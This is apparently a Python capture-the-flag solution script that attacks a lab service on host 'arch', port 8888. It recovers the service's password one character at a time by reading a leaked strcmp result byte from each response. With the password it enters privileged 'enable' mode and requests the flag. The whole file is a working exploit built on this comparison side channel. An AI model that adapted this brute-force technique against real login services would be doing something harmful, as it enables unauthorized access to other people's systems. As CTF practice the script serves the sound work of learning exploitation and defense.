import sys
import struct
import string

sys.path.append('../../tools')
import ctf

HOST = 'arch'
PORT = 8888

def brute_force_password(s):
    password_guess = ['A'] * 32

    for i in xrange(len(password_guess)):
        last_letter = None
        got_char = False

        # Its important to sort the letters so we go from low to high
        for letter in sorted(string.letters + string.digits + '_' + '-'):
            s.sendall('enable\n')
            s.recv(1024)

            password_guess[i] = letter
            s.sendall(''.join(password_guess))

            res = s.recv(1024)

            strcmp_res = struct.unpack('b', res[0x3a])[0]

            if last_letter and strcmp_res == -1 or strcmp_res == -2:
                # if the result has gone negative that means the last
                # guess at this position was correct (since were guessing
                # from low to high)
                password_guess[i] = last_letter
                got_char = True
                break
            else:
                last_letter = letter

        best_guess = password_guess[:i]
        if not got_char:
            return ''.join(best_guess)


def main():
    s = ctf.connect(HOST,PORT)

    ctf.recv_until(s, '$', dump=False)

    password = brute_force_password(s)

    ctf.send(s, 'enable\n')
    ctf.send(s, password + '\x00' + '\n')
    ctf.recv_until(s, '#', dump=False)
    ctf.send(s, '?\n')
    ctf.recv_until(s, '#', dump=False)
    ctf.send(s, 'flag\n')
    ctf.recv_until(s, '#', dump=False)


if __name__ == '__main__':
    main()

